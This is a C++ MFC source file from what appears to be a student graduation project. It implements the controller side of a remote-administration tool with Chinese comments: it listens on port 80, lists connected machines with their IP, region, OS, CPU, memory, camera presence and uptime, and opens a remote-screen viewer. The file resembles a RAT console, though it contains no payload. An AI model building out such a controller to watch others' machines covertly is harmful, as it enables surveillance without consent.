
// ClientDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "biyesheji.h"
#include "ClientDlg.h"
#include "afxdialogex.h"
#include "ScreenDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CClientDlg 对话框




CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CClientDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_pListenThread = NULL;
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_MSG, m_listMsg);
	DDX_Control(pDX, IDC_LIST_COMPUTER, m_listComputer);
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(ID_MONITOR, &CClientDlg::OnBnClickedMonitor)
	ON_BN_CLICKED(ID_MAKESERVER, &CClientDlg::OnBnClickedMakeserver)

	
	ON_MESSAGE(WM_CONNECT_CLIENT,OnConnectClient)
END_MESSAGE_MAP()


// CClientDlg 消息处理程序

BOOL CClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码		
	InitControls();
	m_nListenPort = 80;
	StartListenThread();
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}




void CClientDlg::OnBnClickedMonitor()
{
	// TODO: 在此添加控件通知处理程序代码
	SOCKET hSocket = GetSelectComputerSocket();
	if(hSocket != INVALID_SOCKET)
	{
		// 建立查看远程屏幕窗口并将接收到的图象数据显示出来
		CScreenDlg dlg(NULL,this,hSocket);
		dlg.DoModal();
	}
}



void CClientDlg::OnBnClickedMakeserver()
{
	// TODO: 在此添加控件通知处理程序代码
}




void CClientDlg::InitControls(void) {
	m_listComputer.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_FLATSB|LVS_EX_GRIDLINES);
	m_listComputer.SetTextColor(RGB(0,0,255));

	int nFmt = LVCFMT_CENTER;
	int iSub = 0;
	
	m_listComputer.InsertColumn(iSub ++,"所属地区",		LVCFMT_CENTER,200);	
	m_listComputer.InsertColumn(iSub ++,"IP地址",		LVCFMT_CENTER,120);
	m_listComputer.InsertColumn(iSub ++,"操作系统类型",	LVCFMT_CENTER,150);
	m_listComputer.InsertColumn(iSub ++,"CPU描述",		LVCFMT_CENTER,300);
	m_listComputer.InsertColumn(iSub ++,"内存大小",		LVCFMT_CENTER,80);	
	m_listComputer.InsertColumn(iSub ++,"计算机名称",	LVCFMT_CENTER,120);
	m_listComputer.InsertColumn(iSub ++,"摄像头",		LVCFMT_CENTER,80);
	m_listComputer.InsertColumn(iSub ++,"运行时间",		LVCFMT_CENTER,150);
	m_listComputer.InsertColumn(iSub ++,"上线时间",		LVCFMT_CENTER,150);

	m_listComputer.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_FLATSB|LVS_EX_GRIDLINES);
	m_listMsg.InsertColumn(iSub ++,"控制消息",		LVCFMT_LEFT,650);
}

// 开始客户端发送和接收过程
BOOL CClientDlg::StartListenThread()
{
	StopListenThread();
	
	m_pListenThread = new CListenConnectionThread(m_hWnd,m_nListenPort);
	CheckPointer(m_pListenThread,FALSE);
	
	m_pListenThread->ResumeThread();
	 return TRUE;
}

// 停止客户端发送和接收过程
BOOL CClientDlg::StopListenThread()
{
	SAFE_DELETE(m_pListenThread);
	return TRUE;
}
LRESULT CClientDlg::OnConnectClient(WPARAM wParam,LPARAM lParam)
{
	if(m_pListenThread == NULL)
		return 0;
	
	BOOL bConnected = (BOOL)wParam;
	SOCKET hSocket  = (SOCKET)lParam;
	CString strMsg,strAction,strIP,strAddress;
	
	strIP		= m_pListenThread->GetServerIP(hSocket);
	strAddress	= m_pListenThread->GetServerAddress(hSocket);

	if(bConnected)
	{
		// 上线
		
		// 更新列表
		RefreshComputerList();
		
		strAction.LoadString(IDS_STRING_ONLINE);
	}
	else
	{
		// 下线
		m_pListenThread->DeleteComputer(hSocket);
		
		// 更新列表
		RefreshComputerList();
		
		strAction.LoadString(IDS_STRING_OFFLINE);
	}

	strMsg.Format("%s IP地址: %s 物理地址: %s",strAction,strIP,strAddress);
	AddMsgToList(strMsg);
	return 1;
}


// 刷新计算机列表
BOOL CClientDlg::RefreshComputerList()
{
	CheckPointer(m_pListenThread,FALSE);

	m_listComputer.DeleteAllItems();
	SERVER_REMOTE_S emServer;
	int nOnLine = m_pListenThread->m_arrServer.GetSize();
	for(int nIndex = 0; nIndex < nOnLine; nIndex ++)
	{
		emServer = m_pListenThread->m_arrServer.GetAt(nIndex);
		
		AddMsgToComputerList(emServer);
	}
	

	return TRUE;
}
// 向消息列表添加控制消息
void CClientDlg::AddMsgToList(CString strMsg)
{
	m_listMsg.InsertItem(0,strMsg);
}

// 向计算机列表添加信息
BOOL CClientDlg::AddMsgToComputerList(SERVER_REMOTE_S emServerInfo)
{
	BOOL bRes = TRUE;

	int nItem			= m_listComputer.GetItemCount();
	int nSub			= 1;

	CString strSysVersion,strMemory,strCamera,strRunTime,strOnlineTime;

	// 所属地区
	m_listComputer.InsertItem(nItem,emServerInfo.szAddress,emServerInfo.emSystemInfo.bHaveCamera ? 1 : 0);
	
	// IP地址
	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.szServerIP);
	
	// 操作系统类型
	strSysVersion = GetSystemEditionString(emServerInfo.emSystemInfo.dwMajorVersion,emServerInfo.emSystemInfo.dwMinorVersion,emServerInfo.emSystemInfo.dwPlatformId);
	m_listComputer.SetItemText(nItem,nSub ++,strSysVersion);

	// CPU描述
	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.emSystemInfo.szCPUType);

	// 内存大小
	strMemory.Format(_T("%d M"), emServerInfo.emSystemInfo.dwMemorySize);	
	m_listComputer.SetItemText(nItem,nSub ++,strMemory);	
	
	// 计算机名称
	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.emSystemInfo.szComputerName);
	
	// 当前用户名称
//	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.emSystemInfo.szUserName);	

	// 摄像头
	strCamera = emServerInfo.emSystemInfo.bHaveCamera ? _T("有") : _T("没有");
	m_listComputer.SetItemText(nItem,nSub ++,strCamera);
	
	// 运行时间
	strRunTime.Format("%d天 %d小时 %d分 %d秒",emServerInfo.emSystemInfo.nRunDays,emServerInfo.emSystemInfo.nRunHours,emServerInfo.emSystemInfo.nRunMinutes,emServerInfo.emSystemInfo.nRunSenconds);
	m_listComputer.SetItemText(nItem,nSub ++,strRunTime);
	
	// 上线时间
	strOnlineTime = CTime::GetCurrentTime().Format("%Y-%m-%d %H:%M:%S");
	m_listComputer.SetItemText(nItem,nSub ++,strOnlineTime);	

	return TRUE;
}
// 获取操作系统类型
CString CClientDlg::GetSystemEditionString(DWORD dwMajorVersion,DWORD dwMinorVersion, DWORD dwPlatformId)
{
	CString strRet;
	switch(dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
        if(dwMajorVersion <= 4)
			strRet = "Windows NT";
        if(dwMajorVersion == 5 && dwMinorVersion == 0)
            strRet = "Windows 2000";
        if(dwMajorVersion == 5 && dwMinorVersion == 1)
			strRet = "Windows XP";
        if(dwMajorVersion == 5 && dwMinorVersion == 2)
			strRet = "Windows Server 2003";
		if(dwMajorVersion == 6 && dwMinorVersion == 1)
			strRet = "Windows 7";
        if(dwMajorVersion == 6 && dwMinorVersion == 2)
			strRet = "Windows 8";
		break;
	default:
		strRet = "未知版本";
	}
	return strRet;
}

SOCKET CClientDlg::GetSelectComputerSocket()
{
	int nList = GetListSelect();
	if(nList >= 0)
	{
		SERVER_REMOTE_S emServer;
		emServer = m_pListenThread->m_arrServer.GetAt(nList);
		if(emServer.hSocketServer != INVALID_SOCKET)
		{
			return emServer.hSocketServer;
		}
	}
	
	return INVALID_SOCKET;
}
// 获取列表选中项
int CClientDlg::GetListSelect()
{
	return m_listComputer.GetNextItem(-1,LVNI_SELECTED);
}
